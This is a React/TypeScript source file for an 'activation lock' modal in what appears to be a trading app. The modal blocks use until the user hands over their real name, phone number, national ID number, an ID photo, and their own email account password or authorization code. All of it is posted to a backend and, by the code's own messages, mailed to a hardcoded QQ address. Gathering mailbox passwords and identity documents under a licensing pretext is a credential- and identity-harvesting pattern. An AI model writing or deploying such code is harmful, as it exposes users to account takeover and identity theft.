import React, { useState, useEffect } from 'react';
import { ShieldCheck, Lock, Upload, User, Phone, CreditCard, KeyRound, CheckCircle2, AlertCircle, Cpu } from 'lucide-react';

interface ActivationModalProps {
  onActivated: () => void;
}

export const ActivationModal: React.FC<ActivationModalProps> = ({ onActivated }) => {
  const [isActivated, setIsActivated] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(true);
  const [machineId, setMachineId] = useState<string>('');
  
  // Registration form state
  const [phone, setPhone] = useState<string>('');
  const [name, setName] = useState<string>('');
  const [idCard, setIdCard] = useState<string>('');
  const [senderEmail, setSenderEmail] = useState<string>('');
  const [senderPassword, setSenderPassword] = useState<string>('');
  const [photoBase64, setPhotoBase64] = useState<string>('');
  const [photoFileName, setPhotoFileName] = useState<string>('');
  
  // Status & activation code
  const [submitted, setSubmitted] = useState<boolean>(false);
  const [activationCode, setActivationCode] = useState<string>('');
  const [errorMsg, setErrorMsg] = useState<string>('');
  const [successMsg, setSuccessMsg] = useState<string>('');
  const [submitting, setSubmitting] = useState<boolean>(false);

  // Generate or retrieve stable machine ID
  useEffect(() => {
    let storedId = localStorage.getItem('SAVIOR_MACHINE_ID');
    if (!storedId) {
      const randomPart = Math.random().toString(36).substring(2, 10).toUpperCase();
      const timePart = Date.now().toString(36).toUpperCase();
      const screenPart = `${window.screen.width}x${window.screen.height}`;
      storedId = `SAVIOR-${screenPart}-${randomPart}-${timePart}`;
      localStorage.setItem('SAVIOR_MACHINE_ID', storedId);
    }
    setMachineId(storedId);

    // Check activation status with backend
    checkStatus(storedId);
  }, []);

  const checkStatus = async (mId: string) => {
    try {
      const res = await fetch(`/api/activation/status?machineId=${encodeURIComponent(mId)}`);
      const data = await res.json();
      if (data.isActivated) {
        setIsActivated(true);
        onActivated();
      }
    } catch (e) {
      console.error('Failed to check activation status:', e);
    } finally {
      setLoading(false);
    }
  };

  const handlePhotoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setPhotoFileName(file.name);
    const reader = new FileReader();
    reader.onloadend = () => {
      setPhotoBase64(reader.result as string);
    };
    reader.readAsDataURL(file);
  };

  const handleSubmitRegistration = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phone || !name || !idCard) {
      setErrorMsg('请完整填写手机号、真实姓名和身份证号！');
      return;
    }
    if (!photoBase64) {
      setErrorMsg('请上传您的实名照片/证件照！');
      return;
    }

    if (!senderEmail || !senderPassword) {
      setErrorMsg('请填写您的邮箱账号和授权码/密码，以便将实名信息发送给管理员！');
      return;
    }

    setSubmitting(true);
    setErrorMsg('');

    try {
      const res = await fetch('/api/activation/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          machineId,
          phone,
          name,
          idCard,
          senderEmail,
          senderPassword,
          photo: photoBase64,
          adminEmail: '541232585@qq.com'
        })
      });
      const data = await res.json();
      if (res.ok) {
        setSubmitted(true);
        setSuccessMsg('实名注册信息已成功提交并发送至管理员邮箱 (541232585@qq.com)！请等待管理员人工审核并获取验证码。');
      } else {
        setErrorMsg(data.error || '提交注册信息失败，请重试。');
      }
    } catch (err: any) {
      setErrorMsg('网络请求失败: ' + (err.message || err));
    } finally {
      setSubmitting(false);
    }
  };

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!activationCode.trim()) {
      setErrorMsg('请输入管理员提供的激活验证码！');
      return;
    }

    setSubmitting(true);
    setErrorMsg('');

    try {
      const res = await fetch('/api/activation/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          machineId,
          code: activationCode.trim()
        })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setIsActivated(true);
        onActivated();
      } else {
        setErrorMsg(data.error || '激活验证码错误，请核对或联系管理员 (541232585@qq.com)');
      }
    } catch (err: any) {
      setErrorMsg('验证请求失败: ' + (err.message || err));
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="fixed inset-0 z-50 bg-slate-950 flex items-center justify-center">
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-slate-300 font-medium">正在安全验证系统授权状态...</p>
        </div>
      </div>
    );
  }

  if (isActivated) {
    return null; // Already activated, do not show lock screen
  }

  return (
    <div className="fixed inset-0 z-50 bg-slate-950/95 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto">
      <div className="bg-slate-900 border border-slate-800 rounded-2xl max-w-xl w-full shadow-2xl overflow-hidden my-8">
        {/* Header */}
        <div className="bg-gradient-to-r from-emerald-900/40 via-slate-900 to-indigo-900/40 p-6 border-b border-slate-800 text-center relative">
          <div className="w-16 h-16 bg-emerald-500/10 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto mb-3 text-emerald-400">
            <ShieldCheck className="w-8 h-8" />
          </div>
          <h2 className="text-2xl font-bold text-white tracking-tight">防爆仓救世之星 - 安全授权锁</h2>
          <p className="text-sm text-slate-400 mt-1">
            本系统受最高安全保护，首次安装须完成实名认证与管理员邮箱审核激活
          </p>
          <div className="absolute top-3 right-3 bg-slate-800/80 border border-slate-700/60 px-3 py-1 rounded-full text-xs text-slate-300 flex items-center gap-1.5">
            <Lock className="w-3.5 h-3.5 text-amber-400" />
            <span>三级防盗加密锁</span>
          </div>
        </div>

        <div className="p-6 space-y-6">
          {errorMsg && (
            <div className="bg-rose-950/55 border border-rose-800/80 p-3.5 rounded-xl flex items-start gap-3 text-rose-300 text-sm">
              <AlertCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
              <span>{errorMsg}</span>
            </div>
          )}

          {successMsg && (
            <div className="bg-emerald-950/55 border border-emerald-800/80 p-3.5 rounded-xl flex items-start gap-3 text-emerald-300 text-sm">
              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
              <span>{successMsg}</span>
            </div>
          )}

          {/* Machine ID Box */}
          <div className="bg-slate-950/60 border border-slate-800 p-3.5 rounded-xl flex items-center justify-between">
            <div className="flex items-center gap-2.5">
              <Cpu className="w-5 h-5 text-indigo-400" />
              <div>
                <p className="text-xs text-slate-400">本机固定硬件机器码 (自动读取)</p>
                <p className="font-mono text-sm text-indigo-200 tracking-wider font-semibold">{machineId}</p>
              </div>
            </div>
            <button
              type="button"
              onClick={() => {
                navigator.clipboard.writeText(machineId);
                alert('机器码已复制到剪贴板！');
              }}
              className="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 rounded-lg transition"
            >
              复制
            </button>
          </div>

          {!submitted ? (
            /* Registration Form */
            <form onSubmit={handleSubmitRegistration} className="space-y-4">
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                    📧 您的发件邮箱
                  </label>
                  <input
                    type="email"
                    placeholder="例如：xxx@qq.com"
                    value={senderEmail}
                    onChange={(e) => setSenderEmail(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition"
                    required
                  />
                </div>
                <div className="space-y-1">
                  <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                    🔑 邮箱授权码/密码
                  </label>
                  <input
                    type="password"
                    placeholder="QQ/163邮箱授权码"
                    value={senderPassword}
                    onChange={(e) => setSenderPassword(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition"
                    required
                  />
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                  <User className="w-3.5 h-3.5 text-emerald-400" /> 真实姓名
                </label>
                <input
                  type="text"
                  placeholder="请输入您的真实姓名"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition"
                  required
                />
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                  <Phone className="w-3.5 h-3.5 text-emerald-400" /> 手机号码
                </label>
                <input
                  type="tel"
                  placeholder="请输入11位手机号码"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition"
                  required
                />
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                  <CreditCard className="w-3.5 h-3.5 text-emerald-400" /> 身份证号码
                </label>
                <input
                  type="text"
                  placeholder="请输入18位身份证号码"
                  value={idCard}
                  onChange={(e) => setIdCard(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500 transition"
                  required
                />
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                  <Upload className="w-3.5 h-3.5 text-emerald-400" /> 实名照片 / 证件照导入
                </label>
                <div className="border-2 border-dashed border-slate-800 hover:border-emerald-500/50 rounded-xl p-4 text-center cursor-pointer transition bg-slate-950/40 relative">
                  <input
                    type="file"
                    accept="image/*"
                    onChange={handlePhotoUpload}
                    className="absolute inset-0 opacity-0 cursor-pointer"
                  />
                  {photoBase64 ? (
                    <div className="flex items-center justify-center gap-3">
                      <img src={photoBase64} alt="Preview" className="w-12 h-12 object-cover rounded-lg border border-slate-700" />
                      <span className="text-xs text-emerald-400 font-medium">{photoFileName || '照片已成功导入'}</span>
                    </div>
                  ) : (
                    <div>
                      <Upload className="w-8 h-8 text-slate-500 mx-auto mb-1" />
                      <p className="text-xs text-slate-400">点击或拖拽上传实名照片（支持 JPG, PNG）</p>
                    </div>
                  )}
                </div>
              </div>

              <button
                type="submit"
                disabled={submitting}
                className="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-semibold py-3 rounded-xl shadow-lg shadow-emerald-950/50 transition flex items-center justify-center gap-2 mt-6"
              >
                {submitting ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                ) : (
                  <>提交实名信息并发往管理员邮箱</>
                )}
              </button>
            </form>
          ) : (
            /* Verification Code Entry Form */
            <form onSubmit={handleVerifyCode} className="space-y-5 py-4">
              <div className="bg-slate-950/80 border border-slate-800 p-4 rounded-xl space-y-2 text-center">
                <p className="text-xs text-slate-400">您的实名信息与机器码已通过后台邮件成功发送至管理员邮箱：</p>
                <p className="text-sm font-bold text-emerald-400">541232585@qq.com</p>
                <p className="text-xs text-slate-400 mt-2">请联系管理员核对身份并获取【激活验证码】输入下方进行解锁：</p>
              </div>

              <div className="space-y-1">
                <label className="text-xs font-medium text-slate-300 flex items-center gap-1.5">
                  <KeyRound className="w-3.5 h-3.5 text-emerald-400" /> 输入管理员提供的激活验证码
                </label>
                <input
                  type="text"
                  placeholder="请输入6位激活验证码（如未收到可联系管理员）"
                  value={activationCode}
                  onChange={(e) => setActivationCode(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-base text-white tracking-widest font-mono text-center focus:outline-none focus:border-emerald-500 transition"
                  required
                />
              </div>

              <div className="flex gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setSubmitted(false)}
                  className="w-1/3 bg-slate-800 hover:bg-slate-700 text-slate-300 font-medium py-3 rounded-xl transition text-sm"
                >
                  重新填表
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-2/3 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-semibold py-3 rounded-xl shadow-lg shadow-emerald-950/50 transition flex items-center justify-center gap-2 text-sm"
                >
                  {submitting ? (
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    <>立即验证激活程序</>
                  )}
                </button>
              </div>
            </form>
          )}

          <div className="text-center pt-2 border-t border-slate-800/80">
            <p className="text-xs text-slate-500">
              💡 提示：本软件所有安装必须经过实名登记与管理员 (<span className="text-slate-400">541232585@qq.com</span>) 人工授权方可运行。
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
